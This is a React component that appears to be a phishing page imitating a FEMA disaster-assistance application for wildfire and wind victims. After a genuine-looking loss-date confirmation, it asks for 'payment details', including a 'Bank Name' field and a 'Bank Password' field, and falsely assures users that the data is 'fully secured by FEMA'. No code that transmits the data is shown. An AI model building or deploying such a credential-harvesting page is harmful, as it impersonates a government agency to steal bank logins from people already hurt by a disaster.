import React, { useState } from "react";
import { Link } from "react-router-dom";

const DisasterConfirmation: React.FC = () => {
  const [date, setDate] = useState<string>("");
  const [isChecked, setIsChecked] = useState<boolean>(false);

  return (
    <div className="max-w-2xl mx-auto bg-white p-6 mt-20 shadow-md rounded-lg">
      {/* Header Section */}
      <h1 className="text-2xl font-bold text-gray-800">
        You selected WILDFIRES AND STRAIGHT-LINE WINDS
      </h1>
      <p className="text-gray-700 mt-2">
        <strong>Disaster Date(s):</strong> 01/07/2025 - Present Time
      </p>
      <p className="mt-1 text-sm text-blue-500 underline cursor-pointer">
        If this is not the right one,{" "}
        <a href="#" className="hover:text-blue-700">
          pick another disaster
        </a>
        .
      </p>

      {/* Confirmation Section */}
      <div className="mt-6">
        <label className="block text-gray-800 font-semibold">
          Please confirm the date your losses occurred.{" "}
          <span className="text-red-500">*</span>
        </label>
        <p className="text-sm text-gray-600">
          Just enter the date as close as you can.
        </p>

        <div className="mt-3">
          <input
            type="date"
            value={date}
            onChange={(e) => setDate(e.target.value)}
            className="border border-gray-300 rounded px-3 py-2 w-full focus:ring-blue-500 focus:border-blue-500"
          />
        </div>
        <div className="mt-4">
          <label className="inline-flex items-center">
            <input
              type="checkbox"
              checked={isChecked}
              onChange={() => setIsChecked(!isChecked)}
              className="h-5 w-5 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
            />
            <span className="ml-2 text-gray-800 font-semibold">
              Confirm this date. <span className="text-red-500">*</span>
            </span>
          </label>
        </div>
      </div>

      {/* Note Section */}
      <div className="mt-6 p-4 bg-gray-100 border-l-4 border-gray-400">
        <h2 className="font-semibold text-gray-800">
          We need to check if this date is on the disaster declaration.
        </h2>
        <p className="text-gray-700 mt-2">
          We can't process your application unless your loss date is on the
          declaration. If your losses happened on a different date than the
          disaster date(s),{" "}
          <strong className="font-semibold">you should still apply now.</strong>{" "}
          If your date is added later, we will process your application right
          away.
        </p>
        <p className="text-gray-700 mt-2">
          We also suggest you contact your local emergency management agency to
          report your damage.
        </p>
      </div>
        <p className="block mt-4 text-lg text-gray-800 font-semibold">
        Add payment details{" "}
        <span className="text-red-500">*</span>
      </p>
        <p className="block text-SM text-gray-800 font-semibold">
        Note: Information provided is fully secured by FEMA{" "}
        <span className="text-red-500">*</span>
      </p>
      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
        Bank Name
      </label>
      <input
        type="text"
        id="Home Address"
        // value={zipCode}
        // onChange={handleChange}
        placeholder="Enter Bank Name"
        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
      />
      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
        Bank Password
      </label>
      <input
        type="text"
        id="Home Address"
        // value={zipCode}
        // onChange={handleChange}
        placeholder="Enter Bank Password"
        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
      />
      <Link to='/privacystatementact'>
    <button
        type="submit"
        className="mt-6 mb-4 w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600"
      >
        Next
      </button>
    </Link>
    </div>
  );
};

export default DisasterConfirmation;
